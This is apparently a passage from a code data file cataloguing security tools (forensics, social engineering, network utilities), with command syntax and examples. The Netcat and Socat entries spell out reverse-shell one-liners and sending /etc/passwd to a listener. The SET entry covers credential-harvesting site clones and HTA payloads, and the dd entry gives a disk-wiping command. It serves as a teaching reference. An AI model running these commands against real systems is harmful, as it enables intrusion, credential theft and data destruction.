        syntax: 'foremost -i <disk.img> -o <output-dir>',
        description:
          'Carves all supported file types from the disk image and writes recovered files to the output directory, organised by type in subdirectories.',
        example: 'foremost -i disk.img -o /home/kali/recovered/',
        flags: [
          { flag: '-i', description: 'Input file (disk image, dd dump, or raw device)' },
          { flag: '-o', description: 'Output directory for recovered files' },
          { flag: '-t', description: 'Comma-separated list of file types to recover (e.g. jpg,pdf,zip)' },
          { flag: '-v', description: 'Verbose mode — log all activity' },
          { flag: '-q', description: 'Quick mode — only search for file headers, not footers' },
          { flag: '-a', description: 'Write audit only — log what would be recovered without extracting' },
        ],
      },
      {
        title: 'Recover Specific File Types',
        syntax: 'foremost -t <types> -i <disk.img> -o <output-dir>',
        description:
          'Limits carving to the specified file types, reducing processing time and output volume.',
        example: 'foremost -t jpg,pdf -i disk.img -o /home/kali/recovered/',
      },
      {
        title: 'Carve from a Block Device',
        syntax: 'foremost -i /dev/sdb -o <output-dir>',
        description:
          'Reads directly from a block device rather than a file image. Useful for live acquisition analysis.',
        example: 'foremost -i /dev/sdb -o /home/kali/recovered/',
      },
    ],
    useCases: [
      'Recovering deleted photos, documents, and archives from seized storage media',
      'Carving files from unallocated disk space during forensic investigations',
      'Extracting files from corrupted or partially overwritten file systems',
      'Recovering evidence from formatted drives in incident response cases',
    ],
    tags: ['file-carving', 'recovery', 'forensics', 'disk-image', 'deleted-files'],
    relatedTools: ['scalpel', 'photorec', 'binwalk'],
  },

  {
    name: 'ExifTool',
    slug: 'exiftool',
    category: 'Forensics',
    subcategory: 'Metadata Analysis',
    difficulty: 'Beginner',
    description:
      'Platform-independent Perl library and command-line application for reading, writing, and removing metadata from images, documents, audio, and video files.',
    longDescription:
      'ExifTool supports over 100 file formats and can read and write metadata in standards including EXIF, IPTC, XMP, ID3, RIFF, and dozens of proprietary camera formats. For security purposes, it is used both offensively (extracting GPS coordinates, author names, software versions, and hostnames leaked in document metadata) and defensively (stripping all metadata before publishing files to remove location and identity information). Batch processing, recursive directory scans, and CSV output make it suitable for both manual investigation and automated pipelines.',
    commands: [
      {
        title: 'Read All Metadata',
        syntax: 'exiftool <file>',
        description:
          'Displays all available metadata fields and values from the specified file.',
        example: 'exiftool image.jpg',
        flags: [
          { flag: '-all=', description: 'Remove all metadata from a file (write mode)' },
          { flag: '-Author', description: 'Read or write the Author metadata field' },
          { flag: '-GPS*=', description: 'Remove all GPS-related metadata fields' },
          { flag: '-r', description: 'Recursive mode — process all files in a directory tree' },
          { flag: '-ext', description: 'Filter by file extension' },
          { flag: '-csv', description: 'Output metadata in CSV format for batch analysis' },
        ],
      },
      {
        title: 'Write a Metadata Tag',
        syntax: 'exiftool -<Tag>="<value>" <file>',
        description:
          'Sets the value of a specific metadata tag. ExifTool creates a backup copy (file_original) before modifying.',
        example: 'exiftool -Author="Anonymous" file.pdf',
      },
      {
        title: 'Remove All Metadata',
        syntax: 'exiftool -all= <file>',
        description:
          'Strips all metadata from the file. A backup is created with the _original suffix. Use -overwrite_original to skip the backup.',
        example: 'exiftool -all= image.jpg',
      },
      {
        title: 'Batch Process a Directory',
        syntax: 'exiftool -csv -r <directory>',
        description:
          'Recursively reads metadata from all files in a directory and outputs everything as CSV, suitable for spreadsheet analysis or grepping for sensitive fields.',
        example: 'exiftool -csv -r /home/kali/evidence/ > metadata.csv',
      },
    ],
    useCases: [
      'Extracting GPS location data from photos to determine where an image was taken',
      'Identifying document authorship and editing history from Office metadata',
      'Stripping identifying metadata before publishing images publicly',
      'Discovering software versions and hostnames leaked in document properties',
    ],
    tags: ['metadata', 'exif', 'gps', 'forensics', 'osint', 'steganography'],
    relatedTools: ['steghide', 'strings', 'binwalk'],
  },

  {
    name: 'Steghide',
    slug: 'steghide',
    category: 'Forensics',
    subcategory: 'Steganography',
    difficulty: 'Beginner',
    description:
      'Steganography tool that embeds and extracts hidden files within JPEG, BMP, WAV, and AU cover files using passphrase-protected encryption.',
    longDescription:
      'Steghide uses a passphrase-keyed embedding algorithm to hide data inside image and audio files by modifying the least significant bits of the cover medium. The hidden data is compressed and encrypted (AES-128 by default) before embedding, so the resulting file is indistinguishable from the original to the naked eye. The cover file\'s statistical properties are preserved to resist steganalysis. In CTF competitions and forensics challenges, steghide-protected files are a common hiding mechanism — you need either the passphrase or a brute-force attack with a tool like stegseek to recover the payload.',
    commands: [
      {
        title: 'Embed a Secret File',
        syntax: 'steghide embed -cf <cover-file> -sf <secret-file> -p <passphrase>',
        description:
          'Hides the secret file inside the cover image/audio, protecting it with a passphrase. The original cover file is overwritten with the stego file.',
        example: 'steghide embed -cf image.jpg -sf secret.txt -p "S3cur3P@ss"',
        flags: [
          { flag: 'embed', description: 'Embed a secret file into a cover file' },
          { flag: 'extract', description: 'Extract a hidden file from a stego file' },
          { flag: 'info', description: 'Display information about an embedded payload without extracting' },
          { flag: '-cf', description: 'Cover file (the carrier image or audio)' },
          { flag: '-sf', description: 'Stego file — the secret file to embed, or the stego file to extract from' },
          { flag: '-p', description: 'Passphrase to use for encryption' },
          { flag: '-f', description: 'Force overwrite of existing output files' },
        ],
      },
      {
        title: 'Extract Hidden File',
        syntax: 'steghide extract -sf <stego-file>',
        description:
          'Extracts the hidden data from the stego file. Prompts for the passphrase interactively. Use -p to supply it non-interactively.',
        example: 'steghide extract -sf image.jpg',
      },
      {
        title: 'Inspect Embedded Payload Info',
        syntax: 'steghide info <stego-file>',
        description:
          'Displays metadata about any hidden payload in the file — embedded filename, size, and encryption algorithm — without extracting it.',
        example: 'steghide info image.jpg',
      },
    ],
    useCases: [
      'Solving CTF steganography challenges involving hidden data in images',
      'Identifying steganographic data concealment during forensic investigations',
      'Demonstrating data exfiltration techniques using image files',
      'Covert file transfer testing during red-team exercises',
    ],
    tags: ['steganography', 'hidden-data', 'forensics', 'ctf', 'jpeg', 'encryption'],
    relatedTools: ['exiftool', 'stegsolve', 'binwalk'],
  },

  {
    name: 'dd',
    slug: 'dd',
    category: 'Forensics',
    subcategory: 'Disk Imaging',
    difficulty: 'Intermediate',
    description:
      'Low-level Unix utility for creating bit-for-bit copies of block devices, wiping disks, and converting raw data — the foundational tool for forensic disk imaging.',
    longDescription:
      'dd (data duplicator) reads and writes raw data at a block level, making it ideal for creating forensically sound disk images that include all allocated, unallocated, and slack space. A proper forensic image preserves the exact byte sequence of the original media, including deleted file remnants and file system metadata. The conv=noerror,sync options allow dd to continue past read errors and zero-fill bad sectors, producing a complete image even from damaged media. The dcfldd and dc3dd forks add hashing and progress reporting for forensic workflows.',
    commands: [
      {
        title: 'Create a Forensic Disk Image',
        syntax: 'dd if=<source-device> of=<image.img> bs=512 conv=noerror,sync',
        description:
          'Creates a bit-for-bit image of the source device. conv=noerror continues past read errors; conv=sync zero-pads unreadable sectors to maintain correct offsets.',
        example: 'dd if=/dev/sdb of=/home/kali/evidence/disk.img bs=512 conv=noerror,sync',
        flags: [
          { flag: 'if', description: 'Input file or device path' },
          { flag: 'of', description: 'Output file or device path' },
          { flag: 'bs', description: 'Block size for reads and writes (e.g. 512, 4096, 1M)' },
          { flag: 'count', description: 'Number of blocks to copy before stopping' },
          { flag: 'skip', description: 'Skip N input blocks before starting' },
          { flag: 'seek', description: 'Skip N output blocks before writing' },
          { flag: 'conv', description: 'Conversion options: noerror (skip read errors), sync (pad errors with zeros)' },
        ],
      },
      {
        title: 'Wipe the MBR of a Disk',
        syntax: 'dd if=/dev/zero of=<device> bs=512 count=1',
        description:
          'Overwrites the first 512-byte sector (Master Boot Record) of a disk with zeros, effectively wiping the partition table and MBR boot code.',
        example: 'dd if=/dev/zero of=/dev/sdb bs=512 count=1',
      },
      {
        title: 'Restore a Disk Image',
        syntax: 'dd if=<image.img> of=<destination-device> bs=512',
        description:
          'Writes a previously created disk image back to a physical device, restoring it to the exact state captured in the image.',
        example: 'dd if=/home/kali/evidence/disk.img of=/dev/sdc bs=512',
      },
      {
        title: 'Copy with Live Progress Indicator',
        syntax: 'dd if=<source> of=<destination> bs=4M status=progress',
        description:
          'Copies data with a live progress indicator showing bytes transferred, rate, and estimated time remaining.',
        example: 'dd if=/dev/sdb of=/home/kali/evidence/disk.img bs=4M status=progress',
      },
    ],
    useCases: [
      'Creating forensically sound bit-for-bit copies of evidence drives',
      'Wiping sensitive disks before decommissioning hardware',
      'Restoring backup images to replacement hardware',
      'Extracting specific partitions or sectors for focused analysis',
    ],
    tags: ['disk-imaging', 'forensics', 'block-device', 'data-recovery', 'wiping'],
    relatedTools: ['dcfldd', 'foremost', 'autopsy'],
  },

  // ─────────────────────────────────────────────
  // SOCIAL ENGINEERING
  // ─────────────────────────────────────────────
  {
    name: 'Social-Engineer Toolkit (SET)',
    slug: 'setoolkit',
    category: 'Social Engineering',
    subcategory: 'Phishing & Exploitation',
    featured: true,
    difficulty: 'Beginner',
    description:
      'Python-driven social engineering framework providing menu-guided attack vectors including credential harvesting, spear phishing, site cloning, and payload delivery.',
    longDescription:
      'The Social-Engineer Toolkit (SET) was written by TrustedSec and is purpose-built for performing advanced attacks against human targets. Its menu-driven interface guides practitioners through crafting believable phishing emails, cloning login pages that harvest credentials, and delivering payloads through browser exploits or USB drops. SET integrates tightly with Metasploit for payload generation and handler management. It covers the most common real-world social engineering scenarios: credential harvesting via website clone, spear-phishing campaigns with malicious attachments, and man-in-the-middle browser attacks.',
    commands: [
      {
        title: 'Launch SET Interactive Menu',
        syntax: 'setoolkit',
        description:
          'Starts the Social-Engineer Toolkit and presents the main menu. All attack configuration is done through numbered menu selections.',
        example: 'setoolkit',
      },
      {
        title: 'Credential Harvester via Site Cloner',
        syntax: 'setoolkit → 1 → 2 → 3 → 2',
        description:
          'Navigates to Social-Engineering Attacks (1) > Website Attack Vectors (2) > Credential Harvester Attack Method (3) > Site Cloner (2). Enter the URL to clone and SET captures all submitted credentials.',
        example: 'setoolkit\n# Select: 1 > 2 > 3 > 2\n# Enter IP for listener: 192.168.1.100\n# Enter URL to clone: https://target.com/login',
      },
      {
        title: 'Spear-Phishing Email with Payload',
        syntax: 'setoolkit → 1 → 1',
        description:
          'Navigates to Spear-Phishing Attack Vectors. Create a targeted email with a malicious attachment (PDF, Word macro, executable) that opens a Meterpreter session on the victim\'s machine.',
        example: 'setoolkit\n# Select: 1 > 1\n# Follow prompts for payload, sender address, and target email',
      },
      {
        title: 'HTA Attack via Website Clone',
        syntax: 'setoolkit → 1 → 2 → 6',
        description:
          'Creates a cloned website serving a malicious HTA (HTML Application) that executes when visited by a Windows user, delivering a reverse shell.',
        example: 'setoolkit\n# Select: 1 > 2 > 6\n# Enter IP for listener: 192.168.1.100\n# Enter URL to clone: https://target.com',
      },
    ],
    useCases: [
      'Simulating phishing campaigns to test employee security awareness',
      'Cloning login pages to demonstrate credential theft to clients',
      'Creating malicious email attachments for penetration test scenarios',
      'Testing web proxy and email gateway filtering controls',
      'Demonstrating USB drop attack payloads during physical security assessments',
    ],
    tags: ['social-engineering', 'phishing', 'credential-harvester', 'site-clone', 'set', 'awareness'],
    relatedTools: ['gophish', 'evilginx2', 'beef-xss'],
  },

  {
    name: 'GoPhish',
    slug: 'gophish',
    category: 'Social Engineering',
    subcategory: 'Phishing Simulation',
    difficulty: 'Beginner',
    description:
      'Open-source phishing simulation framework with a web dashboard for building, launching, and tracking phishing campaigns against target user groups.',
    longDescription:
      'GoPhish provides a professional-grade phishing simulation platform that security teams use to measure and improve employee susceptibility to phishing attacks. Campaigns are configured through a clean web dashboard: create email templates with HTML/text bodies, set up landing pages that capture credentials or just log clicks, define target groups from CSV imports, and configure sending profiles (SMTP servers). Real-time campaign statistics track open rates, click rates, form submissions, and reported emails by individual target. A REST API enables automation and integration with ticketing or SIEM systems.',
    commands: [
      {
        title: 'Start GoPhish Server',
        syntax: './gophish',
        description:
          'Launches the GoPhish server. The admin UI is available at https://127.0.0.1:3333 (default credentials: admin/gophish — change immediately). The phishing server listens on port 80 by default.',
        example: './gophish',
      },
      {
        title: 'Access Admin Dashboard',
        syntax: 'https://127.0.0.1:3333',
        description:
          'Opens the GoPhish administration panel. Configure sending profiles, landing pages, email templates, user groups, and campaigns from this interface.',
        example: 'firefox https://127.0.0.1:3333',
      },
      {
        title: 'Query Campaign Stats via API',
        syntax: 'curl -k -H "Authorization: <api-key>" https://127.0.0.1:3333/api/campaigns/<id>/summary',
        description:
          'Retrieves a JSON summary of campaign statistics — clicks, submissions, and open events — using the GoPhish REST API.',
        example: 'curl -k -H "Authorization: 0123456789abcdef" https://127.0.0.1:3333/api/campaigns/1/summary',
      },
    ],
    useCases: [
      'Running employee phishing awareness training campaigns',
      'Measuring click-through and credential submission rates across departments',
      'Demonstrating phishing risk metrics to executive stakeholders',
      'Testing security awareness program effectiveness over time',
    ],
    tags: ['phishing', 'simulation', 'awareness', 'campaign', 'credential-harvest', 'gophish'],
    installCommand: 'Download binary from https://github.com/gophish/gophish/releases',
    relatedTools: ['setoolkit', 'evilginx2', 'king-phisher'],
  },

  // ─────────────────────────────────────────────
  // NETWORK TOOLS
  // ─────────────────────────────────────────────
  {
    name: 'Netcat',
    slug: 'netcat',
    category: 'Network Tools',
    subcategory: 'Networking Utility',
    difficulty: 'Beginner',
    description:
      'The "Swiss Army knife" of networking — a simple utility that reads and writes data across TCP/UDP connections, used for port scanning, file transfer, and reverse shells.',
    longDescription:
      'Netcat is a lightweight, versatile command-line networking utility that can open raw TCP and UDP connections, listen on arbitrary ports, and transfer data between hosts. In penetration testing it is indispensable for catching reverse shells from exploited targets, transferring files without SCP or FTP, and quickly testing open ports. The traditional netcat-traditional package supports -e (execute) for instant bind/reverse shells. The OpenBSD variant (nc) is more common on modern systems but lacks -e; use /bin/bash with /dev/tcp redirection as an alternative. Ncat (from nmap) adds SSL support and connection brokering.',
    commands: [
      {
        title: 'Listen for Incoming Connection',
        syntax: 'nc -lvnp <port>',
        description:
          'Opens a listening TCP socket on the specified port. Use this to catch reverse shells or receive file transfers.',
        example: 'nc -lvnp 4444',
        flags: [
          { flag: '-l', description: 'Listen mode — wait for an incoming connection' },
          { flag: '-v', description: 'Verbose output' },
          { flag: '-n', description: 'Disable DNS resolution — use raw IP addresses' },
          { flag: '-p', description: 'Local port number to listen on' },
          { flag: '-e', description: 'Execute a program after connecting (netcat-traditional only)' },
          { flag: '-z', description: 'Zero I/O mode for port scanning — do not send data' },
          { flag: '-u', description: 'Use UDP instead of TCP' },
          { flag: '-w', description: 'Connection timeout in seconds' },
        ],
      },
      {
        title: 'Connect to a Remote Host',
        syntax: 'nc <host> <port>',
        description:
          'Opens a TCP connection to the specified host and port. Type interactively or pipe data to send it over the connection.',
        example: 'nc 192.168.1.100 4444',
      },
      {
        title: 'Receive a File',
        syntax: 'nc -lvnp <port> > <received-file>',
        description:
          'Listens on a port and redirects all received data into a file. Run this on the attacker side before the sender connects.',
        example: 'nc -lvnp 4444 > received.txt',
      },
      {
        title: 'Send a File',
        syntax: 'nc <host> <port> < <file>',
        description:
          'Connects to a listening nc and streams the contents of a local file over the connection.',
        example: 'nc 192.168.1.100 4444 < /etc/passwd',
      },
      {
        title: 'Bash Reverse Shell',
        syntax: 'bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1',
        description:
          'Redirects bash stdin/stdout/stderr to a TCP connection back to the attacker. Run on the target after nc -lvnp is running on the attacker machine.',
        example: 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1',
      },
      {
        title: 'Port Scan with Netcat',
        syntax: 'nc -zv <host> <port-range>',
        description:
          'Performs a TCP port scan across a port range. -z uses zero I/O mode (no data sent), and -v reports whether each port is open.',
        example: 'nc -zv 192.168.1.1 20-80',
      },
    ],
    useCases: [
      'Catching reverse shells from exploited targets',
      'Transferring files to/from compromised hosts without elevated tools',
      'Quickly testing whether a specific TCP port is open',
      'Creating bind and reverse shell listeners for payload testing',
      'Banner grabbing from network services',
    ],
    tags: ['netcat', 'reverse-shell', 'file-transfer', 'port-scan', 'tcp', 'udp', 'networking'],
    relatedTools: ['socat', 'ncat', 'cryptcat'],
  },

  {
    name: 'Socat',
    slug: 'socat',
    category: 'Network Tools',
    subcategory: 'Networking Utility',
    difficulty: 'Intermediate',
    description:
      'Bidirectional data relay that creates connections between two data channels — files, pipes, devices, or network sockets — enabling advanced tunnelling, port forwarding, and stable TTY shells.',
    longDescription:
      'Socat (SOcket CAT) is a more capable alternative to netcat that understands a rich set of address types beyond simple TCP/UDP: Unix domain sockets, serial ports, SSL/TLS streams, PTY devices, and more. Its primary advantage over netcat in exploitation contexts is the ability to create fully interactive TTY shells over a reverse connection by attaching the remote process to a pseudo-terminal (pty), enabling interactive programs like sudo, ssh, and vi to function correctly. It also supports port forwarding and connection relaying for pivoting through network segments.',
    commands: [
      {
        title: 'Listen for Stable PTY Shell',
        syntax: 'socat TCP-L:<port> FILE:`tty`,raw,echo=0',
        description:
          'Creates a listener that, when connected to by the target, produces a fully interactive PTY shell. The local terminal is set to raw mode so all keystrokes (including Ctrl+C and arrow keys) pass through correctly.',
        example: 'socat TCP-L:4444 FILE:`tty`,raw,echo=0',
      },
      {
        title: 'Connect Back with PTY Shell',
        syntax: 'socat TCP:<attacker-ip>:<port> EXEC:/bin/bash,pty,stderr',
        description:
          'Initiates a reverse connection from the target to the attacker, attaching bash to a PTY. Run this on the compromised target after the listener is started.',
        example: 'socat TCP:192.168.1.100:4444 EXEC:/bin/bash,pty,stderr',
      },
      {
        title: 'Port Forwarding',
        syntax: 'socat TCP-LISTEN:<local-port>,fork TCP:<remote-host>:<remote-port>',
        description:
          'Listens on a local port and forwards all connections to a remote host and port. The fork option creates a new child process for each connection, supporting multiple simultaneous clients.',
        example: 'socat TCP-LISTEN:8080,fork TCP:192.168.1.50:80',
      },
      {
        title: 'File Transfer via Socat',
        syntax: 'socat TCP-L:<port> < <file>',
        description:
          'Listens on a port and streams a file over the connection when a client connects. On the receiving side run: socat TCP:<host>:<port> > outfile',
        example: 'socat TCP-L:4444 < /home/kali/payload.sh',
      },
    ],
    useCases: [
      'Creating fully interactive TTY reverse shells that support interactive programs',
      'Pivoting through compromised hosts via port forwarding',
      'Encrypted tunnelling with SSL/TLS support',
      'Relaying connections between non-routable network segments',
    ],
    tags: ['socat', 'reverse-shell', 'port-forward', 'tty', 'pivot', 'networking'],
    relatedTools: ['netcat', 'ncat'],
  },

  {
    name: 'Proxychains',
    slug: 'proxychains',
    category: 'Network Tools',
    subcategory: 'Proxy & Anonymisation',
    difficulty: 'Beginner',
    description:
      'Forces any TCP connection made by a dynamically linked program through a chain of SOCKS4, SOCKS5, or HTTP proxies — enabling tool proxying through Tor or pivot hosts.',
    longDescription:
      'Proxychains works by preloading a shared library that hooks the connect() system call, transparently routing TCP connections through the configured proxy chain. Configuration is stored in /etc/proxychains4.conf, where you list one or more proxy servers in order. Modes include strict_chain (all proxies must be reachable), dynamic_chain (skips dead proxies), and random_chain. The most common use case is chaining through a SOCKS5 proxy on 127.0.0.1:9050 (Tor) to anonymise scans, or through a SOCKS proxy on a pivot host to reach internal networks from outside.',
    commands: [
      {
        title: 'Run Any Tool Through Proxychains',
        syntax: 'proxychains <tool> [tool-args]',
        description:
          'Prefix any dynamically linked tool with proxychains to route its TCP connections through the configured proxy chain.',
        example: 'proxychains firefox',
      },
      {
        title: 'Run Nmap Through Proxychains',
        syntax: 'proxychains nmap -sT -Pn <target>',
        description:
          'Performs a TCP Connect scan through the proxy chain. Must use -sT (connect scan) as SYN scans require raw sockets. -Pn skips ping as ICMP does not traverse SOCKS proxies.',
        example: 'proxychains nmap -sT -Pn 192.168.1.50',
      },
      {
        title: 'Configure SOCKS5 Proxy',
        syntax: 'echo "socks5 127.0.0.1 9050" >> /etc/proxychains4.conf',
        description:
          'Adds a SOCKS5 proxy entry to the proxychains configuration file. The format is: <type> <host> <port> [user] [pass].',
        example: '# Edit /etc/proxychains4.conf and add:\nsocks5 127.0.0.1 9050',
      },
    ],
    useCases: [
      'Routing attack tools through Tor for anonymisation',
      'Tunnelling tools through a SOCKS proxy on a pivot host to reach internal networks',
      'Bypassing IP-based access controls during external penetration tests',
      'Chaining multiple proxies for additional obfuscation layers',
    ],
    tags: ['proxy', 'socks5', 'tor', 'anonymisation', 'pivot', 'tunnelling'],
    relatedTools: ['tor', 'nmap', 'sqlmap'],
  },

  {
    name: 'Tcpflow',
    slug: 'tcpflow',
    category: 'Network Tools',
    subcategory: 'Traffic Analysis',
    difficulty: 'Beginner',
    description:
      'TCP stream reassembly tool that captures and reconstructs full application-layer conversations from live traffic or pcap files, saving each flow to a separate file.',
    longDescription:
      'Tcpflow captures TCP connections and reconstructs the byte streams of each conversation into separate files named by source/destination IP and port. Unlike Wireshark or tcpdump which present raw packets, tcpflow reassembles out-of-order packets and retransmissions to produce clean, readable application data. This makes it ideal for quickly extracting HTTP bodies, email content, file transfers, and other protocol payloads without learning packet-level analysis. Each flow is saved as a file named in the format src_ip.src_port-dst_ip.dst_port.',
    commands: [
      {
        title: 'Capture TCP Flows Live',
        syntax: 'tcpflow -i <interface>',
        description:
          'Captures all TCP streams on the specified interface and writes each bidirectional flow to separate files in the current directory.',
        example: 'tcpflow -i eth0',
      },
      {
        title: 'Reconstruct Flows from PCAP',
        syntax: 'tcpflow -r <capture.pcap>',
        description:
          'Reads a previously saved pcap file and reconstructs all TCP conversations into separate flow files for analysis.',
        example: 'tcpflow -r capture.pcap',
      },
      {
        title: 'Filter Flows by Port',
        syntax: 'tcpflow -i <interface> port <port>',
        description:
          'Captures only TCP streams on the specified port, using BPF syntax to filter the capture.',
        example: 'tcpflow -i eth0 port 80',
      },
    ],
    useCases: [
      'Extracting HTTP request/response bodies from captured traffic',
      'Recovering files transferred over cleartext protocols (FTP, HTTP)',
      'Analysing application-layer protocol exchanges without packet-level detail',
      'Post-incident traffic analysis from saved pcap files',
    ],
    tags: ['tcp', 'stream-reassembly', 'network', 'traffic-analysis', 'pcap', 'forensics'],
    relatedTools: ['tcpdump', 'wireshark', 'netcat'],
  },
]
